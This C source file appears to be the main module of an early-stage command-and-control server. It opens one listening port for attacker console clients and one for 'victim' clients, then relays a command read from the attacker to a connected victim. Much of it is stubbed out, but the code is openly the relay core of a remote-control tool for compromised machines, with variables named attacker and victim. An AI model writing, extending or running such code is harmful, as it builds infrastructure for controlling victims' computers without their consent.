#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <string.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <arpa/inet.h>

#include "event.h"
#include "server.h"
#include "netwerking.h"

/* Global Vars */
struct commandServer server; /* Server global state  */

void asciiArt(void){
#include "asciilogo.h"

        char *buf = malloc(1024*16);

        snprintf(buf, 1024*16, ascii_logo, 
                KRED, 
                KNRM, KRED, 
                KNRM, KRED, server.cli_port,
                KNRM, KRED, 
                KNRM, KRED, (long) getpid(),
                KNRM
        );
  
        printf("%s", buf);

        free(buf);
}

/* ==== Server Configurations ====  */

int openTcpSocket(int port, int *fd, int *count){
        fd[*count] = initTcpServer(port);
        (*count)++; 
        netNonBlock(NULL, *fd);
        
        return 0;
}

void initServer(void){
        server.pid = getpid();
       
        server.cli_port = DEFAULT_CLI_PORT;
        server.clifd_count = 0;
        
        server.victim_port = DEFAULT_VICTIM_PORT;
        server.victimfd_count = 0;

        server.event_loop = createEpollEventLoop();

        /* Open Sockets */
        openTcpSocket(server.cli_port, server.clifd, &server.clifd_count);
        openTcpSocket(server.victim_port, server.victimfd, &server.victimfd_count);
       
        /* Initialize Server Commands */

        /* Handle Events  */
        // Create event loop for connecting cli clients
        // Create event loop for connecting victim clients
        
}

int main(void){
  
        initServer();
        asciiArt();
       
        // Test new connections 
        int attacker, victim, valread;
        char buffer[1024] = {0}; 
        struct sockaddr_in address;
        int addrlen = sizeof(address);
        
        if ((attacker = accept(server.clifd[0], (struct sockaddr *)&address, (socklen_t*)&addrlen))<0){
                perror("ERROR accept");
        }
        
        if ((victim = accept(server.victimfd[0], (struct sockaddr *)&address, (socklen_t*)&addrlen))<0){
                perror("ERROR accept");
        }
        
        valread = read(attacker, buffer, 1024);
        printf("Received: %s\n",buffer);
        send(victim, buffer, strlen(buffer), 0); 

        //eventMain();
        
        return 0;
}
